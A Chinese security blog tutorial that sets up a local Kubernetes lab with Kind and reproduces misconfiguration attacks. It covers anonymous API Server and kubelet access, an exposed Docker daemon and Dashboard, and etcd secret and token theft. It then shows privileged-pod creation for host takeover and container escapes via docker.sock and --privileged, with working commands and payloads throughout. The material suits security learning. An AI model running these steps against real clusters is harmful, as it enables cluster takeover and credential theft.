
## Kubernetes安全测试实践录

- - -

### [0x00 前言](#toc_0x00)

最近在学习K8S相关云原生技术，因为之前工作的环境中接触到过K8S在CI/CD的场景应用，便一直想找个机会深入钻研一下云安全方向的利用，才有了这篇文章。本文非常适合刚入门或者准备学习云安全方向的安全人员，每个步骤都是亲手复现整理。文中如有错误的地方，还望各位大佬在评论区指正。

### [0x01 利用Kind快速搭建K8S环境](#toc_0x01-kindk8s)

##### [安装Kind](#toc_kind)

Kind是Kubernetes In Docker的缩写，就是将Docker容器作为节点并把K8S快速部署至其中一个Node的工具，且操作简单、学习成本低，非常适合在本地搭建K8S的开发/测试环境。而该工具是由Go语言编写，因此所需的环境就为Go和Docker。

下面就测试在Ubuntu18.04的机器上安装

```plain
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.11.0/kind-linux-amd64
chmod +x ./kind
mv ./kind /usr/local/bin/kind
```

输入kind version查看是否安装成功

##### [安装Kubectl](#toc_kubectl)

```plain
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.21.2/bin/linux/amd64/kubectl
chmod +x ./kubectl
mv ./kubectl /usr/local/bin/kubectl
```

##### [新建一个集群](#toc_)

```plain
kind create cluster --name k8s
```

创建完成后可以通过

```plain
kind get clusters
```

但是如此创建的集群是默认绑定到127.0.0.1地址上的，无法后续的测试，因此我这里直接用--config指定配置文件来创建

```plain
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: k8s  #集群名
nodes: #节点配置，如下，启动一个master节点，一个worker节点
- role: control-plane   #master节点
  image: kindest/node:v1.21.1 #指定镜像，同 kind create cluster参数--image
  extraPortMappings:
  - containerPort: 6443
    hostPort: 26443
    listenAddress: "0.0.0.0"
    protocol: tcp #默认值，可不设置
- role: worker
```

将其保存为k8s.yml文件

```plain
kind create cluster --config k8s.yaml
```

完成后，查看当前已经有的集群

```plain
kind get clusters
```

此时创建好的K8S集群还是Master，如果想在Master节点上直接装Pod，则需要去除污点才可以正常安装Pod

```plain
kubectl taint nodes --all node-role.kubernetes.io/master-
```

如果想要删除某个集群可以使用

```plain
kind delete cluster --name k8s
```

### [0x02 配置不当引发的组件安全问题](#toc_0x02)

##### [API Server未授权访问](#toc_api-server)

运维人员配置不当，将"system:anonymous"用户绑定到"cluster-admin"用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令

```plain
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
```

Poc:

```plain
#查看pods,GET
https://192.168.249.129:26443/api/v1/namespaces/default/pods?limit=500

#创建特权容器,POST
https://192.168.249.129:26443/api/v1/namespaces/default/pods
{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}}\n"},"name":"test-4444","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","name":"test-4444","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":{"path":"/","type":"Directory"},"name":"host"}]}}

#执行命令,GET
https://192.168.249.129:26443/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami
```

在用PostMan测试第三条执行命令的时候我出现了"Upgrade request required"(400)

```plain
{
    "kind": "Status",
    "apiVersion": "v1",
    "metadata": {},
    "status": "Failure",
    "message": "Upgrade request required",
    "reason": "BadRequest",
    "code": 400
}
```

经过查询发现：

对于websocket连接，首先进行http(s)调用，然后是使用HTTP Upgrade标头对websocket的升级请求。

curl/Postman不支持从http升级到websocket。因此错误。

解决办法就是用wscat工具发送包

```plain
wscat -n -c 'https://192.168.249.129:26443/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami'
```

[![1640098336848.png](assets/1698894658-2bb22bb7b67f668c7d456cf92f3bf1dc.png)](https://storage.tttang.com/media/attachment/2021/12/26/c0de7e83-07af-49ae-85ce-351afeed3358.png)

##### [Docker Daemon服务暴露至公网](#toc_docker-daemon)

首先来看一下docker的架构

[![docker.jpg](assets/1698894658-181613b7f2ff00b9f04441da78394d7f.jpg)](https://storage.tttang.com/media/attachment/2021/12/26/dfc0b0c9-dd3b-4f16-bcf1-bbae9292c407.jpg)

分为三个部分，Client上使用命令后，会发送对应的请求到API，也就是Docker Daemon服务。然后docker会去对应的Registry仓库拉取镜像创建容器。

这个服务本地会暴露在unix:///var/run/docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。

这里我模拟运维人员不当操作开启远程的Daemon服务

分别用两种方式开启Docker Daemon服务

方法一：

```plain
# vim /usr/lib/systemd/system/docker.service
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock
```

方法二：

```plain
#vim /etc/docker/daemon.json

{
  "hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]
}
```

我这里用第二种方法配置好之后，重启docker服务

```plain
systemctl daemon-reload
systemctl restart docker
```

如果重启失败，查看报错信息发现是

```plain
from flag: [fd://], from file: [tcp://0.0.0.0:2375]
```

则需要修改docker.service文件内容，将其中的fd://给删除掉

```plain
# ExecStart=/usr/bin/dockerd -H fd://
ExecStart=/usr/bin/dockerd
```

此时就可以发现2375的端口已经暴露在公网上了  
[![1640145305745.png](assets/1698894658-2b03241a0ab598099d934fb3a37e63b3.png)](https://storage.tttang.com/media/attachment/2021/12/26/ae78efaf-ceb5-4461-a58b-4973a9df47cd.png)  
之后攻击者可以通过访问http://192.168.249.129:2375/info查看  
[![1640145433303.png](assets/1698894658-b028c173e7d92a7bb867a838f3754937.png)](https://storage.tttang.com/media/attachment/2021/12/26/a5d017ec-47fb-4e93-ba04-7a890564b90b.png)  
或者是通过-H直接执行docker命令

```plain
root@ubuntu:~# docker -H tcp://192.168.249.129:2375 version
Client:
 Version:           20.10.7
 API version:       1.41
 Go version:        go1.13.8
 Git commit:        20.10.7-0ubuntu5~18.04.3
 Built:             Mon Nov  1 01:04:14 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
```

##### [Kubelet 10250端口未授权访问](#toc_kubelet-10250)

10250端口是kubelet API的HTTPS端口，该端口对外提供了Pod和Node的相关信息，如果该端口对公网暴露，并且关闭授权，则可能导致攻击。

首先修改配置文件/var/lib/kubelet/config.yaml

```plain
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: true
```

修改authentication的anonymous为true

之后访问https://192.168.1.102:10250/pods即可验证漏洞是否存在  
[![1640268929180.png](assets/1698894658-1536b666a40362a638706f7ea1b83893.png)](https://storage.tttang.com/media/attachment/2021/12/26/0b9e9162-5357-458c-bfcb-d3b0b7d75aa2.png)

```plain
curl -k https://172.18.0.2:10250/run/{namespace}/{podName}/{appName} -d "cmd=whoami"
```

直接命令执行  
[![1640269370248.png](assets/1698894658-1c2a4c1ec555b94a98c0380018d3ae68.png)](https://storage.tttang.com/media/attachment/2021/12/26/23201830-7da7-4ece-9e28-31a4f0691aa0.png)  
这里可以通过检索securityContext字段快速找到特权容器，方便之后逃逸容器  
[![1640270482693.png](assets/1698894658-56b229cdbd6bd1784fd4273573bcac97.png)](https://storage.tttang.com/media/attachment/2021/12/26/5655276a-eed6-45d0-8e90-d912effa59c5.png)

##### [Kubernetes Dashboard未授权访问](#toc_kubernetes-dashboard)

在 Kubernetes 社区中，有一个很受欢迎的 Dashboard 项目，它可以给用户提供一个可视化的 Web 界面来查看当前集群的各种信息。用户可以用 Kubernetes Dashboard 部署容器化的应用、监控应用的状态、执行故障排查任务以及管理 Kubernetes 各种资源。  
在开发环境中，很多运维人员对访问Dashboard时需要出示Token或是Config文件觉得麻烦，使用了免登录的Dashboard版本。  
具体环境安装步骤如下  
首先下载官方的安装yaml文件：

```plain
https://github.com/kubernetes/dashboard/blob/master/aio/deploy/recommended.yaml
```

步骤一、修改Deployment  
找到kind: Deployment的地方  
修改成如下内容

```plain
kind: Deployment
apiVersion: apps/v1
metadata:
  labels:
    k8s-app: kubernetes-dashboard
  name: kubernetes-dashboard
  namespace: kubernetes-dashboard
spec:
  replicas: 1
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      k8s-app: kubernetes-dashboard
  template:
    metadata:
      labels:
        k8s-app: kubernetes-dashboard
    spec:
      securityContext:
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: kubernetes-dashboard
          image: kubernetesui/dashboard:v2.4.0
          imagePullPolicy: Always
          ports:
            - containerPort: 8443
              protocol: TCP
            - containerPort: 9090   #Add 9090 Port
              protocol: TCP
              name: http
          args:
            #- --auto-generate-certificates
            - --namespace=kubernetes-dashboard
            # Uncomment the following line to manually specify Kubernetes API server Host
            # If not specified, Dashboard will attempt to auto discover the API server and connect
            # to it. Uncomment only if the default does not work.
            # - --apiserver-host=http://my-address:port
```

本次Deployment改动了两处：  
\- 增加暴露9090非安全端口  
\- 注释掉参数--auto-generate-certificates

步骤二、修改Service  
找到文件中如下内容：

```plain
kind: Service
apiVersion: v1
metadata:
  labels:
    k8s-app: kubernetes-dashboard
  name: kubernetes-dashboard
  namespace: kubernetes-dashboard
spec:
  ports:
    - port: 443
      targetPort: 8443
  selector:
    k8s-app: kubernetes-dashboard
```

修改成如下

```plain
kind: Service
apiVersion: v1
metadata:
  labels:
    k8s-app: kubernetes-dashboard
  name: kubernetes-dashboard
  namespace: kubernetes-dashboard
spec:
  ports:
    - port: 443
      targetPort: 8443
      nodePort: 32001
      name: https
    - port: 80
      targetPort: 9090
      nodePort: 32000
      name: http
  type: NodePort
  selector:
    k8s-app: kubernetes-dashboard
```

本次修改Service内容如下：  
\- 增加9090端口  
\- 配置nodePort，方便对外暴露端口访问  
\- 添加type：NodePort

以上两个步骤全部改完之后通过kubectl apply部署即可访问http://192.168.249.129:32000  
[![1640362696372.png](assets/1698894658-fd4fa3d3aa817d72ffae7e6b6b8d5a5b.png)](https://storage.tttang.com/media/attachment/2021/12/26/696ff0dd-e014-4abc-b777-8c0f167edf86.png)  
获取访问后直接创建特权容器即可getshell

```plain
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /tmp
      name: volume
  volumes:
  - name: volume
    hostPath:
      path: /
```

##### [K8s Config文件泄露](#toc_k8s-config)

如果攻击者通过webshell、GitHub等特定方式拿到该K8s配置的Config文件，就可以用该文件操作集群，从而接管所有容器。

找到config文件有如下三种判断方式：

-   如果提供了--kubeconfig参数，就使用提供的kubeconfig文件。
-   如果没有提供--kubeconfig参数，但设置了环境变量$KUBECONFIG，则使用该环境变量提供的kubeconfig文件。
-   如果以上两种情况都没有，kubectl就使用默认的kubeconfig文件$HOME/.kube/config。

之后通过kubectl --kubeconfig指定设置config文件，就可操作对应的集群容器了。

##### [Etcd未授权访问](#toc_etcd)

Etcd是Kubernetes集群中的一个十分重要的组件，是兼具一致性和高可用性的键值数据库，用于保存集群所有的网络配置和对象的状态信息。通常我们用etcd来存储两个重要服务：

-   网络插件flannel
-   kubernetes本身，包括各种对象的状态和元信息配置

其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。  
首先在Kubernetes中可以更改配置/etc/Kubernetes/manifests/etcd.yaml文件的内容，来将2379端口向外暴露  
[![1640413917419.png](assets/1698894658-dc3b458be5fb796ffae0a1b6248d450d.png)](https://storage.tttang.com/media/attachment/2021/12/26/3bffc3dc-bd23-4c7e-b918-9c6d59ce65f7.png)  
Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3

```plain
export ETCDCTL_API=3
```

当etcd授权的时候会回显如下：

```plain
root@ubuntu:~# etcdctl --endpoints=https://172.18.0.2:2379 get / --prefix --keys-only | grep /secrets/
Error:  context deadline exceeded
```

此时就需要带上相应的证书

```plain
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
```

查看k8s的secrets

```plain
etcdctl get / --prefix --keys-only | grep /secrets/
```

读取service account token

```plain
#etcdctl get / --prefix --keys-only | grep /secrets/kube-system/clusterrole
#etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z
```

[![1640414325780.png](assets/1698894658-2a54e366b70bc5c3d2db9113f78fb3d2.png)](https://storage.tttang.com/media/attachment/2021/12/26/a1fa2c9f-5024-437d-9d14-1afcad41291c.png)  
而读取的Token大概如下模样  
[![1640414390724.png](assets/1698894658-d4188dcd587c55479eacd304c29986c8.png)](https://storage.tttang.com/media/attachment/2021/12/26/ce8ac3b9-9256-41f0-8c00-9ecd0ee5a3c4.png)  
之后就通过token访问API-Server，获取集群的权限：

```plain
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="ey..." -n kube-system get pods
```

[![1640414535899.png](assets/1698894658-49e37b1a7ea22e52c046e16eb702db63.png)](https://storage.tttang.com/media/attachment/2021/12/26/52833037-8293-4f3e-a85c-f1ce55d56a79.png)

##### [Kubectl Proxy命令未安全使用](#toc_kubectl-proxy)

当运维人员需要某个环境暴露端口或者IP时，会用到Kubectl Proxy  
使用kubectl proxy命令就可以使API server监听在本地的8009端口上：

```plain
kubectl proxy --port=8009
```

设置API server接收所有主机的请求：

```plain
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009
```

之后就可以通过特定端口访问k8s集群

```plain
kubectl -s http://192.168.1.101:8009 get pods -n kube-system
```

##### [未开启RBAC控制](#toc_rbac)

如果运维在环境中没有设置RBAC或者Kubernetes版本低于1.16版本，则默认是不会开启RBAC访问控制策略。

基于角色（Role）的访问控制（RBAC）是一种基于组织中用户的角色来调节控制对 计算机或网络资源的访问的方法。

> 在Kubernetes中，授权有ABAC（基于属性的访问控制）、RBAC（基于角色的访问控制）、Webhook、Node、AlwaysDeny（一直拒绝）和AlwaysAllow（一直允许）这6种模式。从1.6版本起，Kubernetes 默认启用RBAC访问控制策略。从1.8开始，RBAC已作为稳定的功能。
> 
> 可以在k8s环境中查看apiserver的参数是否有--authorization-mode=RBAC  
> [![1640503446622.png](assets/1698894658-dfc09f9f7a7908fd922204f5badd69d2.png)](https://storage.tttang.com/media/attachment/2021/12/26/4225b273-b8d5-40bf-a7e4-7f42b62b65c3.png)  
> 我这里直接修改/etc/kubernetes/manifests/kube-apiserver.yaml文件，将--authorization-mode=RBAC的参数给注释掉。
> 
> ServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespace 指定了 pod 所在的 namespace，CA 用于验证 apiserver 的证书，token 用作身份验证。它们都通过 mount 的方式保存在 pod 的文件系统中，其中 token 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/token ，是 apiserver 通过私钥签发 token 的 base64 编码后的结果  

因此我们只需要设置namespace、Token 和 CA给Curl，就可以直接绕过ApiServer的Token验证，以Pod的普通用户身份访问集群了。

```plain
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces
```

[![1640504178998.png](assets/1698894658-a839ed0956ee46655065a879a3fb6b52.png)](https://storage.tttang.com/media/attachment/2021/12/26/6a6e1fb6-9b2c-4a29-9c7a-4f65afa6bc31.png)  
之后的利用就跟API Server未授权访问一样，创建特权容器逃逸即可。

关于这个安全问题如果想看实战可以跳到Annevi师傅的博客：[华为云CTF cloud非预期解之k8s渗透实战](https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/)

### [0x03 容器逃逸](#toc_0x03)

##### [判断是否为容器](#toc__1)

查看是否存在/.dockerenv文件  
检查/proc/1/cgroup是否包含"docker"字符串

##### [Docker in Docker](#toc_docker-in-docker)

这个很好理解，之前介绍Docker Daemon服务的时候就说明过/var/run/docker.sock文件是本地的通信服务，所以这个逃逸就是将/var/run/docker.sock挂载进了Docker容器中，导致可以在容器中执行docker命令。

```plain
docker run --rm -it \  -v /var/run/docker.sock:/var/run/docker.sock \  -v /usr/bin/docker:/usr/bin/docker \  ubuntu \  /bin/bash
```

##### [高危参数启动容器](#toc__2)

特权模式(--privileged)：

```plain
sudo docker run -itd --privileged ubuntu:latest /bin/bash
```

挂载敏感目录(/,/etc,/root/.ssh等)：

```plain
docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
```

挂载权限(--cap-add=SYS\_ADMIN)：  
这个参数会给容器一个SYS\_ADMIN权限，可以在容器中允许执行mount特权操作

```plain
docker run --cap-add=SYS_ADMIN
```

##### [其他容器逃逸漏洞](#toc__3)

这里还有一些其他的容器逃逸漏洞，如：runC容器逃逸漏洞(CVE-2019-5736)、Docker cp命令导致逃逸漏洞(CVE-2019-14271)、Containerd虚拟环境逃逸漏洞(CVE-2020-15257)等。本篇文章因为就不再赘述，网上有各式各样的复现文章，感兴趣的道友可以复现试试。

### [0x04 Reference](#toc_0x04-reference)

\[1\].[https://security.tencent.com/index.php/blog/msg/183](https://security.tencent.com/index.php/blog/msg/183)  
\[2\].[https://mp.weixin.qq.com/s/8lhmjPtLTlVkS1Q3-6-mHA](https://mp.weixin.qq.com/s/8lhmjPtLTlVkS1Q3-6-mHA)  
\[3\].[https://blog.csdn.net/u013488094/article/details/119949527](https://blog.csdn.net/u013488094/article/details/119949527)  
\[4\].[https://www.cdxy.me/?p=827](https://www.cdxy.me/?p=827)  
\[5\].[https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/](https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/)
